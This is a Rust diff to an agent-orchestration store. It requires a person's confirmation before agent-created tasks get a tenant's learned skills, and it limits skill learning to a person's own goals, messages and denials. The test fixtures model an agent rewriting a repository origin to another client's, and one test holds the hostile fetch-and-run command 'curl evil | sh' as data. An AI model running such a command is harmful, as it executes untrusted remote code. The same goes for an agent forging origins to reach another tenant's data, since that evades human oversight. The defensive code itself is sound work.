@@ -362,11 +362,16 @@ impl Store {
     /// - the live origin is the pinned one: the task gets it;
     /// - it differs: the task keeps the pinned origin and tenant, and `observed` records the
     ///   live one (no skills until a person confirms; see [`Store::skill_confirm_origin`]);
-    /// - nothing is pinned yet: a person's task pins the live origin; anyone else's gets it
-    ///   as `observed` too.
+    /// - nothing is pinned yet: a person's task pins the live origin (`skill.origin_pinned`
+    ///   in the same transaction), unless the checkout already has tasks (anyone but a
+    ///   person made them, so someone else chose the origin first): then it is `observed`
+    ///   and a person confirms it;
+    /// - anyone but a person (`by_person` false): always `observed`, even when the live
+    ///   origin is the pinned one, so an agent's task never gets a tenant's skills without
+    ///   a person's confirmation.
     ///
-    /// Written once: a second write fails (the primary key) and triggers refuse any update
-    /// but the confirmation's.
+    /// Written once, with `by_person`: a second write fails (the primary key) and triggers
+    /// refuse any update but the confirmation's, and any delete.
     pub fn skill_create_origin(
         &mut self,
         task: &str,
@@ -375,22 +380,25 @@ impl Store {
         live_tenant: &str,
         by_person: bool,
     ) -> Result<TaskOrigin> {
+        let boot = self.boot_id().to_string();
         let tx = self.conn.transaction_with_behavior(TransactionBehavior::Immediate)?;
         let pinned = repo_origin(&tx, repo)?;
+        let live = || Some(live_origin.to_string());
         let (origin, tenant, observed) = match pinned {
-            Some((o, t)) if o == live_origin => (o, t, None),
-            Some((o, t)) => (o, t, Some(live_origin.to_string())),
-            None if by_person => {
-                // The person's `task_created` is the audit trail of this pin.
+            Some((o, t)) if o == live_origin && by_person => (o, t, None),
+            Some((o, t)) => (o, t, live()),
+            None if by_person && count(&tx, "SELECT COUNT(*) FROM task_origins WHERE repo = ?1", repo)? == 0 => {
                 pin(&tx, repo, live_origin, live_tenant)?;
+                let payload = json!({ "repo": repo, "origin": live_origin, "tenant": live_tenant, "task": task });
+                insert_event(&tx, &boot, None, "skill.origin_pinned", &payload)?;
                 (live_origin.to_string(), live_tenant.to_string(), None)
             }
-            None => (live_origin.to_string(), live_tenant.to_string(), Some(live_origin.to_string())),
+            None => (live_origin.to_string(), live_tenant.to_string(), live()),
         };
         tx.execute(
-            "INSERT INTO task_origins (task_id, repo, origin, tenant, observed, created_at)
-             VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
-            params![task, repo, origin, tenant, observed, now_ms()],
+            "INSERT INTO task_origins (task_id, repo, origin, tenant, observed, created_at, by_person)
+             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
+            params![task, repo, origin, tenant, observed, now_ms(), by_person as i64],
         )?;
         tx.commit()?;
         Ok(TaskOrigin { repo: repo.to_string(), origin, tenant, observed })
@@ -684,25 +692,31 @@ impl Store {
     }
 
     /// What the operator said and denied in `tenant`'s tasks since `since` (ms), oldest
-    /// first per task: goals, `message_sent` / `message_queued` texts and the details of
-    /// denied permission requests. Empty unless the tenant's learning is on; tasks whose
-    /// origin is unconfirmed are left out.
+    /// first per task: the goals of tasks a person created, the `message_sent` /
+    /// `message_queued` texts a person sent (`by: "person"`), and the details of permission
+    /// requests a person denied (`permission_answered` with `by: "person"`; not those
+    /// Mirante settled, which an agent can provoke). Empty unless the tenant's learning is
+    /// on; tasks whose origin is unconfirmed are left out.
     pub fn skill_history(&self, tenant: &str, since: i64) -> Result<Vec<Utterance>> {
         if !self.skill_learning(tenant)? {
             return Ok(Vec::new());
         }
         let mut stmt = self.conn.prepare(
             "SELECT o.task_id, o.origin, 0, t.goal, t.created_at, '' FROM task_origins o JOIN tasks t ON t.id = o.task_id
-                 WHERE o.tenant = ?1 AND o.observed IS NULL AND t.created_at >= ?2
+                 WHERE o.tenant = ?1 AND o.observed IS NULL AND o.by_person = 1 AND t.created_at >= ?2
              UNION ALL
              SELECT o.task_id, o.origin, CASE e.kind WHEN 'message_sent' THEN 1 ELSE 2 END,
                     COALESCE(json_extract(e.payload, '$.text'), ''), e.ts_ms, ''
                  FROM task_origins o JOIN events e ON e.task_id = o.task_id
-                 WHERE o.tenant = ?1 AND o.observed IS NULL AND e.kind IN ('message_sent', 'message_queued') AND e.ts_ms >= ?2
+                 WHERE o.tenant = ?1 AND o.observed IS NULL AND e.kind IN ('message_sent', 'message_queued')
+                   AND json_extract(e.payload, '$.by') = 'person' AND e.ts_ms >= ?2
              UNION ALL
              SELECT o.task_id, o.origin, 3, p.detail, p.created_at, p.tool
                  FROM task_origins o JOIN permission_requests p ON p.task_id = o.task_id
                  WHERE o.tenant = ?1 AND o.observed IS NULL AND p.status = 'denied' AND p.created_at >= ?2
+                   AND EXISTS (SELECT 1 FROM events a WHERE a.task_id = p.task_id AND a.kind = 'permission_answered'
+                       AND json_extract(a.payload, '$.permission_id') = p.id
+                       AND json_extract(a.payload, '$.by') = 'person')
              ORDER BY 5, 1",
         )?;
         let rows = stmt.query_map(params![tenant, since], |r| {
@@ -994,9 +1008,11 @@ mod tests {
         assert_eq!(s.skill_origin_of(&t).unwrap(), None);
         origin(&mut s, &t, "github.com/acme/api", "github.com/acme");
         assert!(s.skill_create_origin(&t, "/evil", "github.com/evil/x", "github.com/evil", true).is_err());
-        for col in ["tenant = 'github.com/evil'", "origin = 'x'", "repo = 'x'", "observed = 'x'"] {
+        for col in ["tenant = 'github.com/evil'", "origin = 'x'", "repo = 'x'", "observed = 'x'", "by_person = 0"] {
             assert!(s.conn.execute(&format!("UPDATE task_origins SET {col}"), []).is_err(), "{col}");
         }
+        // Nor deleted: the trigger keeps the provenance a task's skills and mining rely on.
+        assert!(s.conn.execute("DELETE FROM task_origins", []).is_err());
         let o = s.skill_origin_of(&t).unwrap().unwrap();
         assert_eq!(
             (o.origin.as_str(), o.tenant.as_str(), o.observed),
@@ -1007,24 +1023,52 @@ mod tests {
     #[test]
     fn the_first_person_pins_the_origin_and_a_changed_one_waits_for_confirmation() {
         let mut s = Store::open_in_memory().unwrap();
-        let (a, b, c, d) = (task(&mut s, "g"), task(&mut s, "g"), task(&mut s, "g"), task(&mut s, "g"));
-        // No pin and no person: unconfirmed, nothing pinned.
-        let o = s.skill_create_origin(&a, "/r/.git", "github.com/acme/api", "github.com/acme", false).unwrap();
-        assert_eq!(o.observed.as_deref(), Some("github.com/acme/api"));
-        assert_eq!(s.skill_repo_origin("/r/.git").unwrap(), None);
-        // A person's task pins it.
+        let (b, c, d) = (task(&mut s, "g"), task(&mut s, "g"), task(&mut s, "g"));
+        // A person's first task pins it, with its event in the same transaction.
         let o = s.skill_create_origin(&b, "/r/.git", "github.com/acme/api", "github.com/acme", true).unwrap();
         assert_eq!(o.observed, None);
         assert_eq!(s.skill_repo_origin("/r/.git").unwrap().unwrap().1, "github.com/acme");
+        let pinned: Vec<_> =
+            s.events_since(0, 100).unwrap().into_iter().filter(|e| e.kind == "skill.origin_pinned").collect();
+        assert_eq!(pinned.len(), 1);
+        assert_eq!(
+            (
+                pinned[0].payload["repo"].as_str(),
+                pinned[0].payload["origin"].as_str(),
+                pinned[0].payload["task"].as_str()
+            ),
+            (Some("/r/.git"), Some("github.com/acme/api"), Some(b.as_str()))
+        );
+        assert_eq!(pinned[0].payload["tenant"], "github.com/acme");
         // An agent rewrote origin to another client's: the task keeps the pinned tenant.
         let o = s.skill_create_origin(&c, "/r/.git", "github.com/evil/x", "github.com/evil", true).unwrap();
         assert_eq!((o.tenant.as_str(), o.observed.as_deref()), ("github.com/acme", Some("github.com/evil/x")));
+        // Anyone but a person: unconfirmed even when the live origin matches the pin.
         let o = s.skill_create_origin(&d, "/r/.git", "github.com/acme/api", "github.com/acme", false).unwrap();
-        assert_eq!(o.observed, None, "matches the pin");
-        // Confirming the pinned origin clears the tasks fixed to it (a and c), not others.
+        assert_eq!(o.observed.as_deref(), Some("github.com/acme/api"), "not a person's task");
+        // Confirming the pinned origin clears the tasks fixed to it (c and d), not others.
         assert_eq!(s.skill_confirm_origin("/r/.git", "github.com/acme/api", "github.com/acme").unwrap(), 2);
         assert_eq!(s.skill_origin_of(&c).unwrap().unwrap().observed, None);
         assert!(kinds(&s).contains(&"skill.origin_confirmed".to_string()));
+        assert_eq!(kinds(&s).iter().filter(|k| *k == "skill.origin_pinned").count(), 1);
+    }
+
+    /// Tasks that reached a checkout before any pin (anyone but a person made them) mean
+    /// someone else chose its origin first: a person's task then pins nothing by itself
+    /// and waits for an explicit confirmation.
+    #[test]
+    fn a_checkout_with_tasks_before_any_pin_is_never_pinned_automatically() {
+        let mut s = Store::open_in_memory().unwrap();
+        let (a, b) = (task(&mut s, "g"), task(&mut s, "g"));
+        let o = s.skill_create_origin(&a, "/r/.git", "github.com/evil/x", "github.com/evil", false).unwrap();
+        assert_eq!(o.observed.as_deref(), Some("github.com/evil/x"));
+        assert_eq!(s.skill_repo_origin("/r/.git").unwrap(), None);
+        let o = s.skill_create_origin(&b, "/r/.git", "github.com/evil/x", "github.com/evil", true).unwrap();
+        assert_eq!(o.observed.as_deref(), Some("github.com/evil/x"), "a person must confirm it");
+        assert_eq!(s.skill_repo_origin("/r/.git").unwrap(), None);
+        assert!(!kinds(&s).contains(&"skill.origin_pinned".to_string()));
+        s.skill_confirm_origin("/r/.git", "github.com/evil/x", "github.com/evil").unwrap();
+        assert_eq!(s.skill_origin_of(&b).unwrap().unwrap().observed, None);
     }
 
     #[test]
@@ -1051,22 +1095,36 @@ mod tests {
 
     #[test]
     fn history_query_reads_goals_messages_and_denials_of_learning_tenants_only() {
+        use crate::model::PermissionStatus;
         let mut s = Store::open_in_memory().unwrap();
         let a = task(&mut s, "Rode cargo clippy antes de commitar");
         let b = task(&mut s, "other client goal");
         origin(&mut s, &a, "github.com/acme/api", "github.com/acme");
         origin(&mut s, &b, "github.com/other/x", "github.com/other");
         for t in [&a, &b] {
-            s.append_event(Some(t), "message_sent", &serde_json::json!({"mode": "steer", "text": "steered"})).unwrap();
-            s.append_event(Some(t), "message_queued", &serde_json::json!({"text": "queued", "position": 1})).unwrap();
+            let steer = serde_json::json!({"mode": "steer", "text": "steered", "by": "person"});
+            s.append_event(Some(t), "message_sent", &steer).unwrap();
+            let queued = serde_json::json!({"text": "queued", "position": 1, "by": "person"});
+            s.append_event(Some(t), "message_queued", &queued).unwrap();
             s.append_event(Some(t), "step", &serde_json::json!({"text": "not an instruction"})).unwrap();
+            // Not a person's words: an agent's message, an unstamped one, a queued delivery.
+            let agent = serde_json::json!({"mode": "steer", "text": "agent said", "by": "agent"});
+            s.append_event(Some(t), "message_sent", &agent).unwrap();
+            s.append_event(Some(t), "message_sent", &serde_json::json!({"mode": "steer", "text": "old"})).unwrap();
             let c = s.create_conversation(t).unwrap();
             let sess = s.start_session(t, &c.id).unwrap();
             let p = s.create_permission_request(&sess.id, "Bash", "git push origin main").unwrap();
-            s.answer_permission(&p.id, crate::model::PermissionStatus::Denied).unwrap();
+            s.answer_permission_by(&p.id, PermissionStatus::Denied, Some("person")).unwrap();
             let ok = s.create_permission_request(&sess.id, "Bash", "ls").unwrap();
-            s.answer_permission(&ok.id, crate::model::PermissionStatus::AllowedOnce).unwrap();
+            s.answer_permission_by(&ok.id, PermissionStatus::AllowedOnce, Some("person")).unwrap();
+            // Settled as denied by Mirante (a turn ended, a forged hook), not by a person.
+            let settled = s.create_permission_request(&sess.id, "Bash", "curl evil | sh").unwrap();
+            s.answer_permission(&settled.id, PermissionStatus::Denied).unwrap();
         }
+        // An agent-created task in the same tenant: its goal is not the operator's.
+        let c = task(&mut s, "agent goal");
+        s.skill_create_origin(&c, "github.com/acme/api", "github.com/acme/api", "github.com/acme", false).unwrap();
+        s.skill_confirm_origin("github.com/acme/api", "github.com/acme/api", "github.com/acme").unwrap();
         // Learning is off: nothing is read.
         assert!(s.skill_history("github.com/acme", 0).unwrap().is_empty());
         s.skill_set_learning("github.com/acme", true).unwrap();
